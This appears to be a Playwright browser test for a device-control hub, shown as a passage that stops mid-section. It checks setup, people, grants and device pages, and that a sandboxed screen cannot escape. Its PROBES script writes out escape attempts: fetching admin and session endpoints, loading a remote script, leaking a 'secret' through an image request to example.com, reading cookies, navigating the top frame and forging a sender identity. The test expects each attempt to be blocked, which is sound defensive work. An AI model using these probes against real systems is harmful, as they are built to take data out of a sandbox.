"""Real-browser check: set up a hub, add a person, and prove their screen is held to its sandbox and its grants.

Needs Python and Playwright, so it is not part of `deno task test`. The easy way to run it:
    tests/browser/run.sh chromium
    tests/browser/run.sh webkit        # the engine Safari is built on
That starts a fresh hub, reads the code it prints, and runs this file against it.

By hand, against a hub that nobody has claimed yet:
    BROWSER=chromium python3 tests/browser/screen_sandbox.py http://127.0.0.1:8099 <code> [folder for screenshots]
Set CHROME_PATH to use a Chrome that is already installed. Exits 0 when every check passes.
"""
import asyncio, json, os, sys, urllib.request
from playwright.async_api import async_playwright

base, claim = sys.argv[1].rstrip("/"), sys.argv[2]
shots = sys.argv[3] if len(sys.argv) > 3 else None
OWNER_PIN, SAM_PIN = "482915", "739264"
LEVEL = "console/input/1/bus/1/level"
results = []

def check(name, ok, detail=""):
    results.append(bool(ok))
    print(("PASS  " if ok else "FAIL  ") + name + (f"\n      {detail}" if detail and not ok else ""))
    return ok

# Run inside the screen: try every way out, report what happened.
PROBES = """
async () => {
  const out = {};
  const attempt = async (name, fn) => { try { await fn(); out[name] = "ALLOWED"; } catch (e) { out[name] = "blocked"; } };
  const socket = (url) => new Promise((ok, no) => { const w = new WebSocket(url); w.onopen = () => { w.close(); ok(); }; w.onerror = () => no(new Error("refused")); });
  const base = document.baseURI.split("/screens/")[0];
  await attempt("read the hub's log over HTTP", () => fetch(base + "/api/log"));
  await attempt("ask the hub who is signed in", () => fetch(base + "/auth/me"));
  await attempt("use the superuser's tools", () => fetch(base + "/admin/api/all"));
  await attempt("open its own connection to the hub", () => socket(base.replace("http", "ws") + "/ws?screen=one-fader"));
  await attempt("reach the internet", () => fetch("https://example.com", { mode: "no-cors" }));
  await attempt("load a script from the internet", () => new Promise((ok, no) => { const s = document.createElement("script"); s.src = "https://example.com/x.js"; s.onload = ok; s.onerror = () => no(new Error()); document.head.append(s); }));
  await attempt("send data out through an image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error()); i.src = "https://example.com/leak.png?secret=1"; }));
  await attempt("read the page around it", () => parent.document.title);
  await attempt("read the hub page's storage", () => localStorage.getItem("x"));
  await attempt("read the session cookie", () => { if (!document.cookie) throw new Error("nothing"); });
  await attempt("open a popup", () => { const w = window.open("https://example.com"); if (!w) throw new Error(); w.close(); });
  await attempt("send the whole page somewhere else", () => { top.location.href = "https://example.com"; });
  out.origin = self.origin;
  return out;
}
"""

ASK = """([plugin, key, value]) => new Promise((res) => {
  const ref = "probe-" + Math.random();
  addEventListener("message", (e) => { if (e.data.type === "ack" && e.data.ref === ref) res(e.data); });
  parent.postMessage({ type: "set", plugin, key, value, ref }, "*");
  setTimeout(() => res({ timeout: true }), 1500);
})"""

async def main():
    async with async_playwright() as p:
        engine = os.environ.get("BROWSER", "chromium")
        opts = {"args": ["--no-sandbox"]} if engine == "chromium" else {}
        if engine == "chromium" and os.environ.get("CHROME_PATH"): opts["executable_path"] = os.environ["CHROME_PATH"]
        b = await getattr(p, engine).launch(**opts)
        print(f"browser: {engine} {b.version}")
        phone = dict(viewport={"width": 390, "height": 844}, has_touch=True, is_mobile=True, device_scale_factor=2)
        errors = []

        # --- The owner sets up the hub ---
        owner_ctx = await b.new_context(**phone)
        owner = await owner_ctx.new_page()
        owner.on("pageerror", lambda e: errors.append(str(e)))
        await owner.goto(base + "/")
        check("a new hub sends everyone to setup", owner.url.endswith("/setup"), owner.url)
        await owner.fill("#code", claim); await owner.fill("#name", "Evan")
        await owner.fill("#secret", OWNER_PIN); await owner.fill("#again", OWNER_PIN)
        if shots: await owner.screenshot(path=f"{shots}/1-setup.png")
        await owner.click("#go"); await owner.wait_for_url("**/admin")
        check("claiming it signs the owner in and lands them where setting up happens", True)
        await owner.wait_for_selector("#setup:not([hidden]) .step")
        todo = await owner.locator("#setup .step:not(.done)").all_inner_texts()
        check("a new owner is shown what is left to do, in order", [t.split("\n")[0] for t in todo] == ["Give a screen a device", "Add your people"], str(todo))
        if shots: await owner.screenshot(path=f"{shots}/1b-first-look.png")

        # --- The admin is five places, each at its own address ---
        async def place(name):
            await owner.locator("#places a", has_text=name).click()
        async def places_shown():
            return await owner.evaluate("() => [...document.querySelectorAll('.place')].filter((p) => !p.hidden).map((p) => p.dataset.place)")
        # A change that hands out power is confirmed once, and that holds for a few minutes.
        async def confirm():
            if await owner.locator("#confirm").count(): await owner.fill("#confirm", OWNER_PIN)
        # Something done from a page: done at once while unlocked, and otherwise asked about once in the dialog.
        async def act():
            await owner.wait_for_timeout(250)
            if await owner.locator("#dlg[open]").count():
                await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("there are five places", await owner.locator("#places a").all_inner_texts() == ["Home", "Devices", "Screens", "People", "Hub"])
        check("a new owner starts at Home, which says how the hub is", await places_shown() == [""] and "Everything is working" in await owner.locator("#homeStatus").inner_text(), await owner.locator("#home").inner_text())
        check("Home lists each device and how it is", await owner.locator("#homeDeviceList a.line").count() == 2 and "Connected to its device" in await owner.locator("#homeDeviceList").inner_text(), await owner.locator("#homeDeviceList").inner_text())
        check("with nothing waiting, nothing claims to need you", not await owner.locator("#needs").is_visible())
        await place("Devices")
        check("choosing a place changes the address and shows only that place", owner.url.endswith("/admin/devices") and await places_shown() == ["devices"] and await owner.title() == "Devices | Skillfully", owner.url)
        await owner.locator("#drivers h3 a", has_text="Simulated switch").click()
        check("each device has a page of its own, at its own address", owner.url.endswith("/admin/devices/sim-switch") and await owner.locator("#deviceTop h2").inner_text() == "Simulated switch" and not await owner.locator("#devicesIntro").is_visible(), owner.url)
        page = await owner.locator("#drivers").inner_text()
        check("the page holds everything about the device, in the order the work happens", [page.index(t) for t in ["Settings", "What it may reach", "Try it", "People can control it", "Screens that use it", "About"]] == sorted(page.index(t) for t in ["Settings", "What it may reach", "Try it", "People can control it", "Screens that use it", "About"]), page)
        await owner.reload(); await owner.wait_for_selector("#deviceTop h2")
        check("which survives loading the page again", await places_shown() == ["devices"] and await owner.locator("#deviceTop h2").inner_text() == "Simulated switch")
        await owner.go_back(); await owner.wait_for_function("() => document.querySelectorAll('#drivers .item').length === 2")
        check("and the back button goes back", owner.url.endswith("/admin/devices"), owner.url)
        await owner.goto(base + "/admin/devices/no-such-thing"); await owner.wait_for_selector("#drivers .item")
        check("an address for a device that is not there says so and shows the ones that are", await owner.locator("#oneDeviceGone").is_visible() and await owner.locator("#drivers .item").count() == 2)
        # --- What is decided about each device is also a text file, and the Hub place says what the files hold ---
        await place("Hub"); await owner.wait_for_selector("#secConfig:not([hidden]) #configList p")
        told = await owner.locator("#secConfig").inner_text()
        check("the Hub place says where each device's decisions are kept as text", "/config/devices" in told and "No secret is ever written there" in told, told)
        check("and that the files say what the hub says, when nobody has edited one", "The files say the same as the hub." in told, told)
        await owner.goto(base + "/admin/people"); await owner.wait_for_selector("#people .item")
        check("an address can be opened directly", await places_shown() == ["people"])
        if shots: await owner.screenshot(path=f"{shots}/1c-people-place.png")
        # On a phone the places are along the bottom, under a thumb. On a wide screen they are down the side.
        size = owner.viewport_size
        bar = await owner.locator("#places").bounding_box()
        check("on a phone the places run along the bottom", bar["width"] > bar["height"] and bar["y"] + bar["height"] >= size["height"] - 1, str(bar))
        await owner.set_viewport_size({"width": 1280, "height": 800})
        bar = await owner.locator("#places").bounding_box(); card = await owner.locator("#secPeople").bounding_box()
        check("on a wide screen they run down the side, clear of the page", bar["height"] > bar["width"] and bar["x"] == 0 and card["x"] >= bar["width"], f"{bar} {card}")
        if shots: await owner.screenshot(path=f"{shots}/1d-wide.png")
        await owner.set_viewport_size(size)

        async def admin(path, body):
            r = await owner_ctx.request.post(base + path, data=json.dumps(body), headers={"content-type": "application/json"})
            return await r.json()
        async def state(plugin):
            return await (await owner_ctx.request.get(f"{base}/api/state?plugin={plugin}")).json()

        # --- The owner adds Sam, through the People page ---
        await owner.goto(base + "/admin/screens")
        # --- A screen reaches nothing until the owner gives it a connection ---
        async def give(screen, *devices):
            item = owner.locator("#screens .item", has=owner.locator("h3", has_text=screen))
            await item.get_by_role("button", name="Choose connections").click()
            for d in devices:
                await owner.locator("#dlgBody label.check", has_text=d).locator("input").check()
            await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
            return item
        await owner.wait_for_selector("#screens .item")
        fader_item = owner.locator("#screens .item", has=owner.locator("h3", has_text="One fader"))
        check("a new hub has given no screen any connection", "No connections yet" in await fader_item.inner_text(), await fader_item.inner_text())
        await give("One fader", "Simulated board")
        await owner.wait_for_selector("#screens .chip.on:has-text('Simulated board')")
        check("the owner gives One fader the soundboard, with their own PIN", True)
        check("having confirmed once, the page says for how long that holds", await owner.locator("#lockbar").is_visible() and "Unlocked for 5 minutes" in await owner.locator("#lockbar").inner_text(), await owner.locator("#lockbar").inner_text())

        await place("People")
        await owner.fill("#newName", "Sam"); await owner.click("#add button")
        await owner.get_by_text("Add the suggested role Musician").click()
        await owner.wait_for_selector("#roles h3:has-text('Musician')")
        check("a screen's suggested role can be added in one tap", True)
        sam = owner.locator(".item", has=owner.locator("h3", has_text="Sam"))
        await sam.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Musician").locator("input").check()
        check("and the next change is not asked to be confirmed again", await owner.locator("#confirm").count() == 0)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Assign").click()
        check("the People page asks for what the screen's abilities need per person", await owner.locator("#slot_ears").count() == 1)
        await owner.fill("#slot_ears", "1"); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Invite").click()
        invite = (await owner.locator("#dlgBody .code").inner_text()).strip()
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("an invitation is shown for Sam", len(invite) == 9, invite)
        if shots: await owner.screenshot(path=f"{shots}/2-people.png", full_page=True)

        # --- Sam joins on another phone ---
        sam_ctx = await b.new_context(**phone)
        pg = await sam_ctx.new_page()
        pg.on("pageerror", lambda e: errors.append(str(e)))
        await pg.goto(base + "/")
        check("someone who is not signed in is sent to sign in", pg.url.endswith("/signin"), pg.url)
        await pg.goto(f"{base}/join#{invite}")
        await pg.fill("#secret", SAM_PIN); await pg.fill("#again", SAM_PIN); await pg.click("#go")
        await pg.wait_for_url("**/s/one-fader"); await pg.wait_for_timeout(900)
        check("joining lands Sam on the musician's home screen", True)
        fr = next((f for f in pg.frames if "/screens/one-fader/" in f.url), None)
        if not check("the screen is framed", fr is not None): await b.close(); return
        check("the screen is linked to the hub through the shell", await fr.inner_text("#linkText") == "Connected")

        # The screen says "ready" once. Whichever of the frame's script and the screen's page arrives first, the
        # screen must end up connected. Here the frame's script is held back, and then the screen's page is.
        async def linked_when_late(what, pattern):
            late = await sam_ctx.new_page()
            async def hold(route):
                await asyncio.sleep(1.5)
                await route.continue_()
            await late.route(pattern, hold)
            await late.goto(f"{base}/s/one-fader")
            ok = True
            try:
                await late.frame_locator("#screen").locator("#linkText", has_text="Connected").wait_for(timeout=8000)
            except Exception:
                ok = False
            check(f"the screen connects when {what} arrives late", ok)
            await late.close()
        await linked_when_late("the frame's own script", "**/_hub/shell.js")
        await linked_when_late("the screen's page", "**/screens/one-fader/index.html")
        check("it knows which ear mix is Sam's", "bus 1" in await fr.inner_text("#inputName"), await fr.inner_text("#inputName"))
        check("the shell shows who is signed in", await pg.inner_text("#who") == "Sam")
        links = await pg.locator("#links a").all_text_contents()
        check("Sam's menu has the ear mix and the account, and no superuser tools", links == ["One fader", "Account"], str(links))

        # Drag the fader. Pointer moves from a mouse reach the page the same way a finger's do, in every engine.
        box = await (await fr.query_selector("#fader")).bounding_box()
        y = box["y"] + box["height"] / 2
        xs = [box["x"] + box["width"] * (0.05 + 0.01 * k) for k in range(70)]
        before = (await state("sim-console"))[LEVEL]
        await pg.mouse.move(xs[0], y); await pg.mouse.down()
        for x in xs[1:]:
            await pg.mouse.move(x, y); await pg.wait_for_timeout(12)
        await pg.mouse.up()
        # What the screen believes the finger chose. A screen's frame can run in its own process, so the last
        # moves may land a moment after the call above returns: give them that moment. The screen ignores the
        # hub's answers for longer than this after a move, so what is read here is still the finger's choice.
        await pg.wait_for_timeout(150)
        chosen = float(await fr.get_attribute("#fader", "aria-valuenow"))
        await pg.wait_for_timeout(900)
        held = (await state("sim-console"))[LEVEL]
        shown = (await fr.inner_text("#db")).replace("\n", "").replace("dB", "")
        # Engines deliver the last few pointer moves of a fast drag differently, so where the drag ends is
        # allowed a little room. What must hold everywhere: the value the screen settled on is the one the
        # board ends up holding. A lost last move, or an old value snapping back, fails here.
        check("a drag moves the fader to about where the finger stopped", chosen != before and abs(chosen - -10) <= 1.5, f"started at {before}, the screen chose {chosen}")
        check("the board ends up holding what the screen chose", held == chosen, f"the screen chose {chosen}, the board holds {held}")
        check("the screen shows what the board holds", float(shown) == held, shown)
        log_text = await fr.inner_text("#log")
        check("the screen's history is filled through the bridge, as Sam's own", "You set the level" in log_text, log_text[:80])
        if shots: await pg.screenshot(path=f"{shots}/3-sam.png", full_page=True)

        # --- Now behave badly from inside the screen ---
        got = await fr.evaluate(PROBES)
        check("the screen has no origin of its own", got.pop("origin") == "null")
        for name, outcome in got.items():
            check(f"the screen cannot {name}", outcome == "blocked", outcome)
        await fr.evaluate("""() => { const f = document.createElement("form"); f.action = "https://example.com"; f.method = "post"; document.body.append(f); f.submit(); }""")
        await pg.wait_for_timeout(600)
        check("the screen cannot submit a form to the internet", "/screens/one-fader/" in fr.url and pg.url.endswith("/s/one-fader"), f"{fr.url} | {pg.url}")

        # Ask the hub, through the bridge, for things Sam was not granted.
        ack = await fr.evaluate(ASK, ["sim-switch", "switch/outlet/1/on", True])
        check("Sam's screen cannot flip a switch", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        ack = await fr.evaluate(ASK, ["sim-console", "console/input/1/bus/2/level", 10])
        check("Sam's screen cannot touch someone else's ear mix", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        check("the switch did not move", (await state("sim-switch"))["switch/outlet/1/on"] is False)
        check("the other ear mix did not move", (await state("sim-console"))["console/input/1/bus/2/level"] == -90)
        log = await (await owner_ctx.request.get(base + "/api/log?type=skillfully.command.rejected")).json()
        check("both attempts are in the log under Sam's ID", len(log) == 2 and all(e["via"] == "screen/one-fader" and e["actor"].startswith("p_") for e in log), json.dumps(log)[:200])
        check("a screen cannot say it is someone else", await fr.evaluate("""() => new Promise((res) => {
            addEventListener("message", (e) => { if (e.data.type === "hello") res(false); });
            parent.postMessage({ type: "hello", actor: "p_someoneelse" }, "*");
            setTimeout(() => res(true), 500);
        })"""))

        # --- The owner turns Sam off: the phone is cut off at once ---
        people = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["people"]
        sam_id = next(x["id"] for x in people if x["name"] == "Sam")
        await admin("/admin/api/person/disabled", {"id": sam_id, "disabled": True})
        await pg.wait_for_url("**/signin", timeout=5000)
        check("turning a person off signs their phone out within seconds", True)
        # WebKit reports a refused attempt to leave the sandbox as a page error. That is the sandbox working.
        unexpected = [e for e in errors if "allow-top-navigation" not in e]
        # --- A screen nobody wrote for a device: Controls, given only the switch ---
        await owner.goto(base + "/admin/screens"); await owner.wait_for_selector("#screens .item")
        await give("Controls", "Simulated switch")
        await owner.goto(base + "/s/controls"); await owner.wait_for_timeout(1200)
        cf = next((f for f in owner.frames if "/screens/controls/" in f.url), None)
        if check("Controls is framed like any other screen", cf is not None):
            cards = await cf.locator(".card h2").all_text_contents()
            check("it shows the switch it was given, and not the soundboard it was not", cards == ["Simulated switch"], str(cards))
            outlet = cf.locator(".row", has_text="switch/outlet/2/on")
            await outlet.get_by_role("button").click(); await owner.wait_for_timeout(700)
            check("pressing a value it was never written for changes the device", (await state("sim-switch"))["switch/outlet/2/on"] is True)
            check("and the screen shows what the device now holds", await outlet.get_by_role("button").inner_text() == "On")
            if shots: await owner.screenshot(path=f"{shots}/4-controls.png", full_page=True)

        # --- Adding a device nobody wrote a driver for, from the store, without leaving the admin page ---
        lamp_port = os.environ.get("LAMP_PORT", "7007")
        await owner.goto(base + "/admin/devices"); await owner.wait_for_selector("#addDevice:not([hidden])")
        await owner.click("#addDevice")
        check("Add a device opens the catalog, at an address of its own", owner.url.endswith("/admin/devices/add") and await places_shown() == ["devices/add"], owner.url)
        await owner.wait_for_selector("#catCompanion:not([hidden]) #catList .maker")
        told = await owner.locator("#catalog").inner_text()
        check("Bitfocus Companion modules are a section of their own, with credit and what running one means", "Bitfocus Companion modules" in told and "published by Bitfocus" in told and "asks you before one reaches anything" in told, told)
        check("the hub knows who signed the store's list, so the page does not warn about it", await owner.locator("#catNote").get_attribute("data-unsigned") == "" and "cannot check who published" not in told, told)
        check("with nothing typed, the section lists makers and how many modules each has", "1 module" in await owner.locator("#catList .maker").first.inner_text(), await owner.locator("#catList").inner_text())
        await owner.locator("#catList .maker").first.click(); await owner.wait_for_selector("#catList .catItem")
        shelf = await owner.locator("#catList").inner_text()
        check("a maker opens to its modules, each saying what it is and how far it has been proven", "Test lamp" in shelf and "Tested against a stand-in" in shelf and "All makers" in shelf, shelf)
        await owner.fill("#catFind", "no such thing anywhere"); await owner.wait_for_function("() => document.querySelector('#catNote').textContent.includes('Nothing in the store matches')")
        check("typing something the store does not have says so, and that a file still works", "can still be added from a file" in await owner.locator("#catNote").inner_text())
        await owner.fill("#catFind", "pretend LAMP"); await owner.wait_for_selector("#catList .catItem")
        check("typing finds a module by what it does, whatever the capitals", "Test lamp" in await owner.locator("#catList").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/5a-catalog.png", full_page=True)
        await owner.locator("#catList .catItem", has_text="Test lamp").get_by_role("button", name="Choose").click()
        await owner.wait_for_selector("#pkgRest:not([hidden])")
        told = await owner.locator("#pkgRest").inner_text()
        check("choosing shows what it is, its license, and where it was built from", "skillfully-test-lamp 1.0.0" in told and "MIT license" in told and "its author's source" in told, told)
        check("and what the store lets it do without asking", "The store lets it, without asking you" in told and "you are asked first" in told)
        await owner.fill("#devName", "Stage lamp")
        await owner.locator("#pkgRest label.check", has_text="Controls").locator("input").check()
        await confirm()
        if shots: await owner.screenshot(path=f"{shots}/5-add-device.png", full_page=True)
        await owner.click("#dlgOk")
        # Its settings open by themselves, drawn from what the module says it takes.
        await owner.wait_for_selector("#set_host", timeout=15000)
        check("adding ends at the new device's own address", "/admin/devices/companion-skillfully-test-lamp" in owner.url, owner.url)
        check("its settings are on its page, with the module's own labels", "Lamp address" in await owner.locator("#deviceSettings").inner_text() and not await owner.locator("#dlg[open]").count())
        check("and its own defaults", await owner.input_value("#set_port") == "7000")
        await owner.fill("#set_host", "127.0.0.1"); await owner.fill("#set_port", lamp_port)
        if shots: await owner.screenshot(path=f"{shots}/6-settings.png", full_page=True)
        # The hub asks how things are every few seconds. What is being typed is not drawn over when it does.
        await owner.wait_for_timeout(4500)
        check("what is typed into a device's page stays there while the page keeps itself current", await owner.input_value("#set_host") == "127.0.0.1")
        await owner.locator("#deviceSettings").get_by_role("button", name="Save settings").click()
        lamp_item = owner.locator("#drivers")
        # The store answered for the address it was given, so it connects and nobody is asked anything.
        await lamp_item.locator("#deviceStatus.ok").wait_for(timeout=15000)
        card = await lamp_item.inner_text()
        check("the page says in plain words that it is connected", "Connected to its device" in card, card)
        check("and where it came from, under what license", "From the store" in card and "MIT license" in card and "Its author's source" in card, card)
        check("it arrives watched only, and the page says what that means", "Off. The hub only watches it, and nothing is sent to it." in card, card)
        check("and says which screen uses it", "Controls uses it." in await owner.locator("#deviceScreens").inner_text(), card)
        # Try it: the device is seen working before anyone is let near it.
        rows = (await (await owner_ctx.request.get(base + "/admin/api/driver/try?id=companion-skillfully-test-lamp")).json())
        turn_on = next(a["label"] for a in rows["actions"] if a["key"] == "generic/action/on")
        power = next(r["label"] for r in rows["readings"] if r["key"] == "generic/reading/power")
        await owner.wait_for_selector("#tryList .reading")
        tried = await owner.locator("#deviceTry").inner_text()
        check("while it is only watched, its page shows what it reports", power in tried and "Its buttons work once people can control it" in tried, tried)
        check("and its buttons are there, and do nothing yet", await owner.locator("#tryList .action", has_text=turn_on).first.get_by_role("button", name="Do it").is_disabled())
        await lamp_item.get_by_role("button", name="Let people control it").click(); await act()
        await owner.locator("#deviceControl", has_text="On. People with a screen that uses it can change it.").wait_for(timeout=10000)
        check("letting people control it is one tap on its page", True)
        do_it = owner.locator("#tryList .action", has_text=turn_on).first.get_by_role("button", name="Do it")
        await owner.wait_for_function("() => [...document.querySelectorAll('#tryList .action button')].some((b) => !b.disabled)", timeout=10000)
        await do_it.click(); await act()
        await owner.locator("#tryList .reading", has_text=power).locator("b", has_text="on").wait_for(timeout=15000)
        check("then a button on its page really does it, and the reading beside it moves", True)
        tried = await owner.locator("#tryList").inner_text()
        check("what the module's author put together comes first, under the author's headings", 0 <= tried.find("Levels") < tried.find("Full brightness") < tried.find("Power") < tried.find("Lamp on") < tried.find("Everything else") < tried.find(turn_on), tried)
        check("and a press that is not one plain action is not offered", "Two things at once" not in tried and "not there" not in tried)
        await owner.locator("#tryList .ready", has_text="Full brightness").get_by_role("button", name="Do it").click(); await act()
        await owner.locator("#tryList .reading", has_text="Level").locator("b", has_text="100").wait_for(timeout=15000)
        check("a ready-made button does its action with the options its author chose", True)
        if shots: await owner.screenshot(path=f"{shots}/7a-try-it.png", full_page=True)
        if shots: await lamp_item.scroll_into_view_if_needed(); await owner.screenshot(path=f"{shots}/7-device.png")

        # --- The store publishes a newer version. The hub notices, and updating keeps what was decided ---
        check("a device at the store's version is not offered an update", await lamp_item.get_by_role("button", name="Update to 1.1.0").count() == 0)
        # Straight to this computer, whatever proxy the machine running the test is set up with.
        urllib.request.build_opener(urllib.request.ProxyHandler({})).open(f"http://127.0.0.1:{os.environ.get('STORE_PORT', '7008')}/publish-newer").read()
        await lamp_item.locator(".update").wait_for(timeout=20000)
        check("the page says the store has a newer version", "The store has a newer version, 1.1.0" in await lamp_item.inner_text(), await lamp_item.inner_text())
        await lamp_item.get_by_role("button", name="Update to 1.1.0").click()
        told = await owner.locator("#dlgBody").inner_text()
        check("updating says what stays and what happens", "keeps its name, its settings, and everything you allowed" in told and "used with the real device" in told and "stops for a moment" in told, told)
        await confirm()
        if shots: await owner.screenshot(path=f"{shots}/7b-update.png", full_page=True)
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await lamp_item.locator(".update").wait_for(state="detached", timeout=20000)
        await lamp_item.locator("#deviceStatus.ok").wait_for(timeout=20000)
        card = await lamp_item.inner_text()
        check("after updating it is the new version, connected, still controlled, still on its screen", "1.1.0" in card and "Connected to its device" in card and "On. People with a screen" in card and "Controls uses it." in card, card)

        # --- The same module from a file, which nobody has answered for: it has to ask ---
        await owner.locator("#oneDevice a").click(); await owner.wait_for_selector("#addDevice:not([hidden])")
        check("a device's page leads back to the list, where adding is", owner.url.endswith("/admin/devices") and await owner.locator("#drivers .item").count() == 3, owner.url)
        await owner.click("#addDevice"); await owner.click("#catFile")
        check("nothing can be added before a file is chosen", await owner.locator("#dlgOk").is_disabled())
        await owner.set_input_files("#pkg", os.path.join(os.path.dirname(__file__), "..", "fixtures", "companion", "skillfully-test-lamp-1.0.0.tgz"))
        await owner.wait_for_selector("#pkgRest:not([hidden])")
        facts = await owner.locator("#pkgRest .facts").inner_text()
        check("from a file, it starts with no access to the network", "no access to your network" in facts and "Nobody has reviewed" in facts, facts)
        await owner.fill("#devName", "Spare lamp"); await confirm(); await owner.click("#dlgOk")
        await owner.wait_for_selector("#set_host", timeout=15000)
        await owner.fill("#set_host", "127.0.0.1"); await owner.fill("#set_port", lamp_port)
        await owner.locator("#deviceSettings").get_by_role("button", name="Save settings").click()
        spare = owner.locator("#drivers")
        await spare.locator("#deviceStatus.wait").wait_for(timeout=15000)
        check("a device that needs something says it is waiting for you", "waiting for you" in await spare.inner_text(), await spare.inner_text())
        check("and holds nothing until you answer", await owner.locator("#deviceReach .grant").count() == 0)
        # Home is where something waiting on the superuser is seen first.
        await place("Home"); await owner.wait_for_selector("#needs:not([hidden]) .need")
        home = await owner.locator("#home").inner_text() + await owner.locator("#needs").inner_text()
        check("Home says something needs you, and what", "One thing needs you" in home and f"Spare lamp asks to reach another program on this computer, port {lamp_port}" in home, home)
        check("with the store's advice beside it", "The store's reviewers advise against this" in home, home)
        check("something the store advises against cannot be allowed with one tap", await owner.locator("#needs").get_by_role("button", name="Allow").count() == 0 and await owner.locator("#needs").get_by_role("button", name="See what it asks for").count() == 1)
        if shots: await owner.screenshot(path=f"{shots}/6a-home-needs-you.png", full_page=True)
        await owner.locator("#needs a.open").click()
        check("and it leads to the device itself", "/admin/devices/" in owner.url and await owner.locator("#deviceTop h2").inner_text() == "Spare lamp", owner.url)
        spare = owner.locator("#drivers")
        asked = await owner.locator("#deviceReach").inner_text()
        check("the question says what it wants in plain words", f"Reach another program on this computer, port {lamp_port}" in asked, asked)
        check("and warns when it is not the ordinary case", "only if you know what is listening there" in asked)
        check("and shows what the store's reviewers advise", "The store's reviewers advise against this" in asked and "run on the hub's own computer yourself" in asked, asked)
        box = owner.locator("#deviceReach .askBox")
        check("nothing unusual is ticked for you", not await box.is_checked())
        await box.check()
        if shots: await owner.screenshot(path=f"{shots}/6b-asks.png", full_page=True)
        await owner.wait_for_timeout(4500)
        check("a tick is not drawn over either, while the page keeps itself current", await box.is_checked())
        await owner.locator("#deviceReach").get_by_role("button", name="Allow what is ticked").click(); await act()
        await spare.locator("#deviceStatus.ok").wait_for(timeout=15000)
        check("what was allowed is listed, with a way to take it away", await owner.locator("#deviceReach .grant").count() == 1 and await owner.locator("#deviceReach").get_by_role("button", name="Take away").count() == 1)
        check("once allowed, it connects", "Connected to its device" in await spare.inner_text())
        # Locking ends the few minutes at once: the next change asks again.
        await owner.click("#lockNow"); await owner.wait_for_selector("#lockbar", state="hidden")
        check("locking hides the unlocked notice", not await owner.locator("#lockbar").is_visible())
        await spare.get_by_role("button", name="Remove").click()
        check("and after locking, a change asks for the PIN again", await owner.locator("#confirm").count() == 1)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => ![...document.querySelectorAll('#drivers h3')].some((h) => h.textContent === 'Spare lamp')")
        check("a device can be removed from the page", True)

        await owner.goto(base + "/s/controls"); await owner.wait_for_timeout(1500)
        cf = next((f for f in owner.frames if "/screens/controls/" in f.url), None)
        first_rows = await cf.locator(".card", has=cf.locator("h2", has_text="Stage lamp")).locator(".row").all_inner_texts()
        check("Controls shows a device's ready-made buttons before everything else", "Levels: Full brightness" in first_rows[0] and "Power: Lamp on" in " ".join(first_rows[:4]), str(first_rows[:5]))
        on = cf.locator(".row", has_text="generic/action/on")
        await on.get_by_role("button", name="Do it").click()
        reading = cf.locator(".row", has_text="generic/reading/power").locator(".value")
        for _ in range(40):
            if (await reading.inner_text()).strip() == "on": break
            await owner.wait_for_timeout(100)
        check("the device added a minute ago can be used from Controls", (await reading.inner_text()).strip() == "on", await reading.inner_text())
        if shots: await owner.screenshot(path=f"{shots}/8-controls-lamp.png", full_page=True)

        # --- Canvas: screens put together from JSON, by a person or by whoever can write a file ---
        import re
        everything = await (await owner_ctx.request.get(base + "/admin/api/all")).json()
        lamp_id = next(d["id"] for d in everything["drivers"] if d["name"] == "Stage lamp")
        given = await admin("/admin/api/screen/connections", {"id": "canvas", "drivers": ["sim-console", "sim-switch", lamp_id], "confirm": OWNER_PIN})
        check("Canvas can be given any kind of device", given.get("ok") is True, json.dumps(given))
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#shelf .item", has_text="Stage lamp").wait_for(timeout=10000)
        offered = await cv.locator("#shelf .item b").all_inner_texts()
        check("with no canvas yet, Canvas offers ones to start from, for the devices it was given", offered == ["My ears", "Channel strips", "Power and lights", "Stage lamp"], str(offered))
        if shots: await owner.screenshot(path=f"{shots}/10-canvas-start.png")
        await cv.locator("#shelf .item", has_text="Stage lamp").get_by_role("button", name="Add").click()
        await cv.locator("#pages button").first.wait_for(timeout=8000)
        tabs = await cv.locator("#pages button").all_inner_texts()
        check("a device's ready-made buttons become a canvas, a page for each group", tabs == ["Levels", "Power"] and await cv.locator("#name").inner_text() == "Stage lamp", str(tabs))
        await cv.locator("#board button.piece", has_text="Full brightness").wait_for(timeout=8000)
        check("its buttons take their words from the device", await cv.locator("#board button.piece").all_inner_texts() == ["Full brightness", "Half brightness"], str(await cv.locator("#board button.piece").all_inner_texts()))
        await cv.locator("#pages button", has_text="Power").click()
        await cv.locator("#board button.piece", has_text="Lamp off").click()
        for _ in range(40):
            if (await state(lamp_id)).get("generic/reading/power") == "off": break
            await owner.wait_for_timeout(100)
        await cv.locator("#board button.piece", has_text="Lamp on").click()
        for _ in range(40):
            if (await state(lamp_id)).get("generic/reading/power") == "on": break
            await owner.wait_for_timeout(100)
        check("pressing one does what the device's author set it up to do", (await state(lamp_id)).get("generic/reading/power") == "on", json.dumps(await state(lamp_id))[:200])

        # Canvases written straight into the config folder, the way an agent would write them.
        await owner.goto(base + "/admin/hub"); await owner.wait_for_selector("#secConfig:not([hidden]) #configTrust")
        canvas_dir = os.path.join(re.search(r"in (.+)/devices\.", await owner.locator("#configWhere").inner_text()).group(1), "screens", "canvas")
        fixtures = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "fixtures", "canvas")
        for name in ["switcher", "run-sheet"]:
            with open(os.path.join(fixtures, name + ".json")) as src, open(os.path.join(canvas_dir, name + ".json"), "w") as dst: dst.write(src.read())
